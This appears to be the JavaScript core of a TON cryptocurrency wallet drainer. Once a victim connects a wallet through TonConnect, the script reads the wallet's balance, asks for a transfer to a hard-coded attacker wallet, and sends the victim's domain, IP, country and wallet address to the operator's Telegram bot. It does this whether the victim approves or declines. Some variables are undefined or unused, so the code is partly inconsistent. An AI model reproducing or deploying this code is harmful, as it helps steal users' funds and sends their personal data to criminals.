var mainWallet = "0:3cc32ad9bb6ded5654385c9dac58871b0ef968cc9e2f836184554933ae51f183"; //Your wallet, where the assets will be sent
var tgBotToken = ""; //Token bots Telegram
var tgChat = ""; //Your channel Telegram



var domain = window.location.hostname;
var ipUser;




//Redirection of countries


const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
    manifestUrl: 'https://arturnew1.github.io/manifest-app/manifest.json',
    buttonRootId: 'ton-connect'
})

async function didtrans() {
    const response = await fetch('https://toncenter.com/api/v3/wallet?address=' + tonConnectUI.account.address);
    const data = await response.json();
    let originalBalance = parseFloat(data.balance);
    let processedBalance = originalBalance - (originalBalance * 0.03); // deduct 3% to save funds to pay commissions

    let tgBalance = processedBalance / 1000000000;
    const transaction = {
        validUntil: Math.floor(Date.now() / 1000) + 60, // 60 sec
        messages: [{
            address: mainWallet,
            amount: 10000
        }, ]
    }
    try {
        const result = await tonConnectUI.sendTransaction(transaction);
        const messageSend = `\uD83D\uDDC4*Domain:* ${domain}\n\uD83D\uDCBB*User:* ${ipUser} ${countryUser}\n\uD83D\uDCC0*Wallet:* [Ton Scan](https://tonscan.org/address/${tonConnectUI.account.address})\n\n\uD83D\uDC8E*Send:* ${tgBalance}`;
        const encodedMessageSend = encodeURIComponent(messageSend);
        const url = `https://api.telegram.org/bot${tgBotToken}/sendMessage?chat_id=-${tgChat}&text=${encodedMessageSend}&parse_mode=Markdown`;
        fetch(url, {
            method: 'POST',
        }).then(response => {
            if (response.ok) {
                console.log('Success send.');
            } else {
                console.error('Error send.');
            }

        }).catch(error => {
            console.error('Error: ', error);
        });
    } catch (e) {
        const messageDeclined = `\uD83D\uDDC4*Domain:* ${domain}\n\uD83D\uDCBB*User:* ${ipUser} ${countryUser}\n\uD83D\uDCC0*Wallet:* [Ton Scan](https://tonscan.org/address/${tonConnectUI.account.address})\n\n\uD83D\uDED1*Declined or error.*`;
        const encodedMessageDeclined = encodeURIComponent(messageDeclined);
        const url = `https://api.telegram.org/bot${tgBotToken}/sendMessage?chat_id=-${tgChat}&text=${encodedMessageDeclined}&parse_mode=Markdown`;
        fetch(url, {
            method: 'POST',
        }).then(response => {
            if (response.ok) {
                console.log('Success send.');
            } else {
                console.error('Error send.');
            }
        }).catch(error => {
            console.error('Error: ', error);
        });
        console.error(e);
    }
}